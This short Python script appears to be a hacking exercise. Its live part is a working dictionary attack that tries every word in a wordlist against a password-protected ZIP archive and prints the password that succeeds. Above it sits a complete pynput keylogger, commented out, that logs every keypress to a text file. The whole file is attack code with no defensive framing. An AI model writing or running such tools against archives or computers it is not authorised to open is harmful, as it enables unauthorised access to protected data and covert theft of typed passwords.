# from pynput.keyboard import Key, Listener
# import logging

# logging.basicConfig(filename="keylogger.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

# def on_press(key):
#     logging.info(str(key))
#     print(key)

# with Listener(on_press=on_press) as listener:
#     listener.join()



import zipfile
from tqdm import tqdm

wordlist = "mdp.txt"
zip_file = "protected.zip"

zip_file = zipfile.ZipFile(zip_file)
n_words = len(list(open(wordlist, "rb")))
print("Total passwords to test:", n_words)


with open(wordlist, "rb") as wordlist:
    for word in tqdm(wordlist, total=n_words, unit="word"):
        try:
            zip_file.extractall(pwd=word.strip())
        except:
            continue
        else:
            print("[+] Password found:", word.decode().strip())
            exit(0)
print("[!] Password not found, try other wordlist.")
